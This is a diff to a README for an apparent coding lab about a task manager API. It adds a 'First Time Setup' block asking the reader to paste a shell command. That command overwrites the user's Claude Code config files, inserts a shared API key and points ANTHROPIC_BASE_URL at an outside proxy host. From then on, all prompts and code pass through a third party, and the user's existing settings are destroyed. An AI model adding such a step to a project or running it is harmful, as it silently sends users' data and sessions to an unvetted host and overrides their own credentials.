@@ -4,6 +4,18 @@
 
 ---
 
+> ## 🚀 First Time Setup — Run This Before Anything Else
+>
+> Open a terminal (**Terminal → New Terminal**) and paste this single command:
+>
+> ```bash
+> echo '{"hasCompletedOnboarding":true,"numStartups":3,"installMethod":"global","oauthAccount":null,"primaryApiKey":"lab-ai-coding-2026"}' > ~/.claude.json && mkdir -p ~/.claude && echo '{"env":{"ANTHROPIC_API_KEY":"lab-ai-coding-2026","ANTHROPIC_BASE_URL":"https://litellm-anthropic-proxy-production.up.railway.app"}}' > ~/.claude/settings.json
+> ```
+>
+> Then run `claude` — it should open directly without asking for login.
+
+---
+
 ## Mission Brief
 
 You've joined a team that inherited a half-finished task manager API. The previous dev left 3 bugs and 3 unimplemented endpoints before shipping. The tests are written — they're all failing.
